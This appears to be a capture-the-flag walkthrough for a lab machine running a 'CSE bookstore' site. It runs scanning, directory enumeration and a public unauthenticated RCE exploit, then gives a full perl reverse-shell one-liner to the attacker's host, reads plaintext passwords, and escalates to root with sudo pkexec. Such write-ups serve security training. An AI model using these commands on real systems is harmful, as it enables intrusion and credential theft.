## Nmap

```
nmap 192.168.178.111 -p- -sS -sV

Host is up (0.097s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION

```

Checking out port 80 we have the default install page for Apache 2.

Checking the source on this page reveals no interesting information. From here I executed dirsearch.py against the target machine.

```
sudo python3 dirsearch.py -u http://192.168.178.111/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --full-url -t 75 
```

Checking the directory /store we are presented a web page for 'CSE bookstore'.

Researching exploits on Google for 'CSE bookstore' we are presented with an exploit for Unauthenticated RCE. The exploit PoC has been linked below.

After downloading the PoC I executed it with the following command:

```
python3 47887.py http://192.168.178.111/store/
```

When prompted to launch a shell hit 'y'.

This shell stops us from properly navigating the target machine and will return us back to the current working directory when the command has finished executing. As such I checked what binary's are installed on the target machine so we can spawn a shell where we can navigate the target properly.

As per above `perl` is installed on the system. From here I started a `netcat` listener on my attacking machine.

```
sudo nc -lvp 80
```

![](<../../../.gitbook/assets/image (1581).png>)

I then executed the following command to gain a `perl` reverse shell.

```
perl -e 'use Socket;$i="192.168.49.178";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

Moving into the home directory and then into the user tony's home directory we have passwords.txt. Reading the contents of this text file shows the following information:

![](<../../../.gitbook/assets/image (1583).png>)

```
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

I then able to login with the `SSH` password for the user tony.

Checking `sudo -l` for `sudo` permissions we come into a multitude of entries.

![](<../../../.gitbook/assets/image (1585).png>)

As we can execute `sudo` as the user root without supplying a password here I will use `pkexec` to spawn a bash shell as root.

```
sudo pkexec /bin/sh
```
